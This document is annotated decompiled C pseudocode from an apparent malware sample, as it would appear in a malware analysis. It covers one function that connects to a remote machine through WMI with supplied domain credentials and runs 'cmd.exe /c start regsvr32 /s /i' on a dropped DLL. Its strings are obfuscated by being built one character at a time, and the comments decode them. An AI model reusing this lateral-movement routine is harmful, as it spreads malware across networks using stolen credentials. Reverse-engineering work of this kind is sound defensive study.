```c
bool __thiscall mw_connect_to_remote_server_and_load_dll_using_COM(mw_ctx_t *arg_ctx)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  vb_result = 0;
  v_ctx = arg_ctx;
  // Registers security and sets the default security values for the process.
  // The server can obtain the client's identity (RPC_C_IMP_LEVEL_IDENTIFY)
  CoInitializeSecurity(0, -1u, 0, 0, 0, RPC_C_IMP_LEVEL_IDENTIFY, 0, 0, 0);
  vp_IWbemLocator = 0;

  // Connecting to the class object associated with the specified CLSID_WbemLocator
  if ( CoCreateInstance(
         &CLSID_WbemLocator,
         0,
         CLSCTX_REMOTE_SERVER|CLSCTX_LOCAL_SERVER|CLSCTX_INPROC_HANDLER|CLSCTX_INPROC_SERVER,
         &IID_IWbemLocator_0,
         (LPVOID *)&vp_IWbemLocator) >= 0 )
  {
    // "\\%s\root\cimv2" -> (size: 16)
    // namespace root\cimv2 contains many more classes that may serve internal purposes
    vwstr_root_cimv2_namespace[2] = '%';
    vwstr_root_cimv2_namespace[5] = 'r';
    vwstr_root_cimv2_namespace[0] = '\\';
    vwstr_root_cimv2_namespace[1] = '\\';
    vwstr_root_cimv2_namespace[4] = '\\';
    vwstr_root_cimv2_namespace[9] = '\\';
    vwstr_root_cimv2_namespace[6] = 'o';
    vwstr_root_cimv2_namespace[7] = 'o';
    vwstr_root_cimv2_namespace[0xA] = 'c';
    vwstr_root_cimv2_namespace[0xB] = 'i';
    vwstr_root_cimv2_namespace[0xC] = 'm';
    vwstr_root_cimv2_namespace[0xD] = 'v';
    v_remote_network_resource = arg_ctx->remote_network_resource;
    vwstr_root_cimv2_namespace[0xE] = '2';
    vwstr_root_cimv2_namespace[0xF] = '\0';
    vwstr_root_cimv2_namespace[3] = 's';
    vwstr_root_cimv2_namespace[8] = 't';
    if ( _vsprintf_(vstr_NetworkResource, 0x800u, vwstr_root_cimv2_namespace, v_remote_network_resource) >= 0 )
    {
      vbstr_NetworkResource = SysAllocString(vstr_NetworkResource);
      if ( vbstr_NetworkResource )
      {
        v3 = arg_ctx->username;
        if ( v3 )
        {
          if ( arg_ctx->domain_name )
          {
            vwstr_user_name = arg_ctx->username;
            vwstr_domain_name = arg_ctx->domain_name;
            // "%s\%s" -> (size: 6)
            vwstr_format[2] = '\\';
            vwstr_format[0] = '%';
            vwstr_format[1] = 's';
            vwstr_format[3] = '%';
            vwstr_format[4] = 's';
            vwstr_format[5] = 0;
            if ( _vsprintf_(vwstr_domain_name_user_name, 0x800u, vwstr_format, vwstr_domain_name, vwstr_user_name) < 0 )
            {
LABEL_56:
              SysFreeString(vbstr_NetworkResource);
              goto release_com_obj;
            }
            v3 = vwstr_domain_name_user_name;
          }
          mw_SysAllocString(&vbstr_domain_name_user_name, v3);
        }
        else
        {
          vbstr_domain_name_user_name = 0;
        }
        v5 = arg_ctx->password;
        if ( v5 )
          mw_SysAllocString(&vbstr_Password, v5);
        else
          vbstr_Password = 0;
        vp_IWbemServices = 0;
        vp_IWbemLocatorVtbl = vp_IWbemLocator->lpVtbl;

        // creates a connection through DCOM to a WMI namespace on the computer specified in the 
        // strNetworkResource parameter (use IWbemLocator::ConnectServer method)
        // obtain pointer vp_IWbemServices to make IWbemServices calls
        if ( vp_IWbemLocatorVtbl->ConnectServer(
               vp_IWbemLocator,
               vbstr_NetworkResource,
               vbstr_domain_name_user_name,
               vbstr_Password,
               0,
               0,
               0,
               0,
               &vp_IWbemServices) < 0 )
          goto LABEL_53;

        // Setup struct store credentials
        memset(&vp_creds_info, 0, sizeof(vp_creds_info));
        vwstr_domain_name_ = v_ctx->domain_name;
        vp_creds_info.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;// The strings in this structure are in Unicode format.
        if ( vwstr_domain_name_ )
        {
          vp_creds_info.Domain = vwstr_domain_name_;
          v9 = vwstr_domain_name_ + 1;
          while ( *vwstr_domain_name_++ )
            ;
          vp_creds_info.DomainLength = vwstr_domain_name_ - v9;
        }
        vwstr_user_name_ = v_ctx->username;
        if ( vwstr_user_name_ )
        {
          v12 = v_ctx->username;
          vp_creds_info.User = v12;
          bstrString = vwstr_user_name_ + 1;
          while ( *v12++ )
            ;

          vp_creds_info.UserLength = v12 - bstrString;
        }
        vwstr_password = v_ctx->password;
        if ( vwstr_password )
        {
          vp_creds_info.Password = v_ctx->password;
          v15 = vwstr_password + 1;
          while ( *vwstr_password++ )
            ;
          vp_creds_info.PasswordLength = vwstr_password - v15;
        }
        vp_AuthInfo = &vp_creds_info;
        if ( !vwstr_user_name_ )
          vp_AuthInfo = 0;

        // Sets the authentication information that will be used to make calls on the specified proxy
        // RPC_C_AUTHN_WINNT : NTLMSSP
        // RPC_C_AUTHN_LEVEL_CALL: Authenticates only at the beginning of each remote procedure call when the server receives the request
        // RPC_C_IMP_LEVEL_IMPERSONATE: The server process can impersonate the client's security context while acting on behalf of the client. 
        // This level of impersonation can be used to access local resources such as files
        if ( CoSetProxyBlanket(
               (IUnknown *)vp_IWbemServices,
               RPC_C_AUTHN_WINNT,
               0,
               0,
               RPC_C_AUTHN_LEVEL_CALL,
               RPC_C_IMP_LEVEL_IMPERSONATE,
               vp_AuthInfo,
               0) < 0 )
        {
LABEL_53:
          if ( vp_IWbemServices )
            vp_IWbemServices->lpVtbl->Release(vp_IWbemServices);
          SysFreeString(vbstr_Password);
          SysFreeString(vbstr_domain_name_user_name);
          goto LABEL_56;
        }
        vwstr_Win32_process[0] = 'W';
        vwstr_Win32_process[1] = 'i';
        vwstr_Win32_process[2] = 'n';
        vwstr_Win32_process[3] = '3';
        vwstr_Win32_process[4] = '2';
        vwstr_Win32_process[5] = '_';
        vwstr_Win32_process[6] = 'P';
        vwstr_Win32_process[9] = 'c';
        vwstr_Win32_process[0xA] = 'e';
        vwstr_Win32_process[0xB] = 's';
        vwstr_Win32_process[0xC] = 's';
        vwstr_Win32_process[0xD] = 0;
        vwstr_Win32_process[7] = 'r';
        vwstr_Win32_process[8] = 'o';
        vbstr_Win32_process = SysAllocString(vwstr_Win32_process);
        if ( vbstr_Win32_process )
        {
          vp_IWbemClassObject = 0;
          // retrieves the Win32_Process WMI class (represents a process on an operating system).
          if ( vp_IWbemServices->lpVtbl->GetObjectA(vp_IWbemServices, vbstr_Win32_process, 0, 0, &vp_IWbemClassObject, 0) < 0 )
          {
LABEL_50:
            if ( vp_IWbemClassObject )
              vp_IWbemClassObject->lpVtbl->Release(vp_IWbemClassObject);
            SysFreeString(vbstr_Win32_process);
            goto LABEL_53;
          }
          vstr_Create_method[0] = 'C';
          vstr_Create_method[1] = 'r';
          vstr_Create_method[2] = 'e';
          vstr_Create_method[5] = 'e';
          vstr_Create_method[3] = 'a';
          vstr_Create_method[6] = '\0';
          vstr_Create_method[4] = 't';
          vbstr_Create = SysAllocString(vstr_Create_method);
          if ( vbstr_Create )
          {
            pInParamsDefinition = 0;
            // Set up to call the Win32_Process::Create method
            if ( vp_IWbemClassObject->lpVtbl->GetMethod(vp_IWbemClassObject, vbstr_Create, 0, &pInParamsDefinition, 0) < 0 )
            {
LABEL_47:
              if ( pInParamsDefinition )
                pInParamsDefinition->lpVtbl->Release(pInParamsDefinition);
              SysFreeString(vbstr_Create);
              goto LABEL_50;
            }
            ppNewInstance = 0;
            // IWbemClassObject::SpawnInstance method to create a new instance of a class
            if ( pInParamsDefinition->lpVtbl->SpawnInstance(pInParamsDefinition, 0, &ppNewInstance) < 0 )
              goto LABEL_45;
            // "C:\Windows\system32\cmd.exe /c start C:\Windows\system32\regsvr32.exe /s /i C:\Windows\%s.dll" -> (size: 94)
            // Create the values for the in-parameters
            vwstr_exec_dll_command[0] = 'C';
            vwstr_exec_dll_command[1] = ':';
            vwstr_exec_dll_command[3] = 'W';
            vwstr_exec_dll_command[4] = 'i';
            vwstr_exec_dll_command[5] = 'n';
            vwstr_exec_dll_command[6] = 'd';
            vwstr_exec_dll_command[7] = 'o';
            vwstr_exec_dll_command[9] = 's';
            vwstr_exec_dll_command[0xB] = 's';
            vwstr_exec_dll_command[0xD] = 's';
            vwstr_exec_dll_command[8] = 'w';
            vwstr_exec_dll_command[0xE] = 't';
            vwstr_exec_dll_command[2] = '\\';
            vwstr_exec_dll_command[0xA] = '\\';
            vwstr_exec_dll_command[0x10] = 'm';
            vwstr_exec_dll_command[0x11] = '3';
            vwstr_exec_dll_command[0x12] = '2';
            vwstr_exec_dll_command[0x13] = '\\';
            vwstr_exec_dll_command[0x14] = 'c';
            vwstr_exec_dll_command[0x15] = 'm';
            vwstr_exec_dll_command[0x16] = 'd';
            vwstr_exec_dll_command[0x17] = '.';
            vwstr_exec_dll_command[0xF] = 'e';
            vwstr_exec_dll_command[0x18] = 'e';
            vwstr_exec_dll_command[0x1A] = 'e';
            vwstr_exec_dll_command[0x1B] = ' ';
            vwstr_exec_dll_command[0x19] = 'x';
            vwstr_exec_dll_command[0xC] = 'y';
            vwstr_exec_dll_command[0x1C] = '/';
            vwstr_exec_dll_command[0x1D] = 'c';
            vwstr_exec_dll_command[0x1F] = 's';
            vwstr_exec_dll_command[0x20] = 't';
            vwstr_exec_dll_command[0x21] = 'a';
            vwstr_exec_dll_command[0x1E] = ' ';
            vwstr_exec_dll_command[0x24] = ' ';
            vwstr_exec_dll_command[0x22] = 'r';
            vwstr_exec_dll_command[0x25] = 'C';
            vwstr_exec_dll_command[0x26] = ':';
            vwstr_exec_dll_command[0x23] = 't';
            vwstr_exec_dll_command[0x28] = 'W';
            vwstr_exec_dll_command[0x29] = 'i';
            vwstr_exec_dll_command[0x2A] = 'n';
            vwstr_exec_dll_command[0x2B] = 'd';
            vwstr_exec_dll_command[0x2C] = 'o';
            vwstr_exec_dll_command[0x31] = 'y';
            vwstr_exec_dll_command[0x2D] = 'w';
            vwstr_exec_dll_command[0x33] = 't';
            vwstr_exec_dll_command[0x2E] = 's';
            vwstr_exec_dll_command[0x30] = 's';
            vwstr_exec_dll_command[0x32] = 's';
            vwstr_exec_dll_command[0x35] = 'm';
            vwstr_exec_dll_command[0x36] = '3';
            vwstr_exec_dll_command[0x27] = '\\';
            vwstr_exec_dll_command[0x2F] = '\\';
            vwstr_exec_dll_command[0x38] = '\\';
            vwstr_exec_dll_command[0x37] = '2';
            vwstr_exec_dll_command[0x3B] = 'g';
            vwstr_exec_dll_command[0x3C] = 's';
            vwstr_exec_dll_command[0x34] = 'e';
            vwstr_exec_dll_command[0x39] = 'r';
            vwstr_exec_dll_command[0x3A] = 'e';
            vwstr_exec_dll_command[0x3D] = 'v';
            vwstr_exec_dll_command[0x3F] = '3';
            vwstr_exec_dll_command[0x40] = '2';
            vwstr_exec_dll_command[0x41] = '.';
            vwstr_exec_dll_command[0x42] = 'e';
            vwstr_exec_dll_command[0x44] = 'e';
            vwstr_exec_dll_command[0x3E] = 'r';
            vwstr_exec_dll_command[0x45] = ' ';
            vwstr_exec_dll_command[0x48] = ' ';
            vwstr_exec_dll_command[0x4B] = ' ';
            vwstr_exec_dll_command[0x43] = 'x';
            vwstr_exec_dll_command[0x46] = '/';
            vwstr_exec_dll_command[0x49] = '/';
            vwstr_exec_dll_command[0x4C] = 'C';
            vwstr_exec_dll_command[0x4D] = ':';
            vwstr_exec_dll_command[0x4A] = 'i';
            vwstr_exec_dll_command[0x4F] = 'W';
            vwstr_exec_dll_command[0x50] = 'i';
            vwstr_exec_dll_command[0x51] = 'n';
            vwstr_exec_dll_command[0x52] = 'd';
            vwstr_exec_dll_command[0x53] = 'o';
            vwstr_exec_dll_command[0x54] = 'w';
            vwstr_exec_dll_command[0x57] = '%';
            vwstr_exec_dll_command[0x59] = '.';
            vwstr_exec_dll_command[0x5A] = 'd';
            vwstr_exec_dll_command[0x5B] = 'l';
            vwstr_exec_dll_command[0x5C] = 'l';
            vwstr_exec_dll_command[0x5D] = '\0';
            vwstr_exec_dll_command[0x47] = 's';
            vwstr_exec_dll_command[0x4E] = '\\';
            vwstr_exec_dll_command[0x55] = 's';
            vwstr_random_guid = v_ctx->wstr_random_guid;
            vwstr_exec_dll_command[0x56] = '\\';
            vwstr_exec_dll_command[0x58] = 's';
            if ( _vsprintf_(vwstr_exec_dll_full_command, 0x800u, vwstr_exec_dll_command, vwstr_random_guid) < 0 )
            {
LABEL_45:
              if ( ppNewInstance )
                ppNewInstance->lpVtbl->Release(ppNewInstance);
              goto LABEL_47;
            }
            vbstr_exec_dll_full_command = SysAllocString(vwstr_exec_dll_full_command);
            if ( vbstr_exec_dll_full_command )
            {
              sub_10001F93(&pvarg_str_exec_dll_full_command, &vbstr_exec_dll_full_command);
              vwstr_CommandLine[0] = 'C';
              vwstr_CommandLine[1] = 'o';
              vwstr_CommandLine[2] = 'm';
              vwstr_CommandLine[3] = 'm';
              vwstr_CommandLine[4] = 'a';
              vwstr_CommandLine[6] = 'd';
              vwstr_CommandLine[7] = 'L';
              vwstr_CommandLine[8] = 'i';
              vwstr_CommandLine[0xA] = 'e';
              vwstr_CommandLine[0xB] = '\0';
              vwstr_CommandLine[5] = 'n';
              vwstr_CommandLine[9] = 'n';

              // Store the value for the in-parameters
              if ( ppNewInstance->lpVtbl->Put(ppNewInstance, vwstr_CommandLine, 0, &pvarg_str_exec_dll_full_command, 0) < 0 )
              {
LABEL_44:
                VariantClear(&pvarg_str_exec_dll_full_command);
                SysFreeString(vbstr_exec_dll_full_command);
                goto LABEL_45;
              }
              ppOutParams = 0;

              // Execute Method
              if ( vp_IWbemServices->lpVtbl->ExecMethod(vp_IWbemServices, vbstr_Win32_process, vbstr_Create, 0, 0, ppNewInstance, &ppOutParams, 0) < 0 )
              {
LABEL_42:
                if ( ppOutParams )
                  ppOutParams->lpVtbl->Release(ppOutParams);
                goto LABEL_44;
              }
              // To see what the method returned,
              // The return value will be in &v_ReturnValue
              vwstr_ReturnValue[0] = 'R';
              vwstr_ReturnValue[2] = 't';
              vwstr_ReturnValue[4] = 'r';
              vwstr_ReturnValue[5] = 'n';
              vwstr_ReturnValue[6] = 'V';
              vwstr_ReturnValue[7] = 'a';
              vwstr_ReturnValue[8] = 'l';
              vwstr_ReturnValue[0xB] = '\0';
              vwstr_ReturnValue[1] = 'e';
              vwstr_ReturnValue[3] = 'u';
              vwstr_ReturnValue[9] = 'u';
              vwstr_ReturnValue[0xA] = 'e';
              vbstr_ReturnValue = SysAllocString(vwstr_ReturnValue);
              if ( vbstr_ReturnValue )
              {
                *(_QWORD *)&v_ReturnValue.vt = 0i64;
                v_ReturnValue.llVal = 0i64;
                VariantInit(&v_ReturnValue);
                bstrString = vbstr_ReturnValue;
                if ( ppOutParams->lpVtbl->Get(ppOutParams, v43, 0, &v_ReturnValue, 0, 0) >= 0 )
                  vb_result = v_ReturnValue.lVal == 0;
                VariantClear(&v_ReturnValue);
                SysFreeString(bstrString);
                goto LABEL_42;
              }
            }
          }
        }
      }
      // raise an execption
      mw_raise_exception(DDERR_OUTOFMEMORY);
    }
  }
release_com_obj:
  if ( vp_IWbemLocator )
    vp_IWbemLocator->lpVtbl->Release(vp_IWbemLocator);
  return vb_result;
}
```
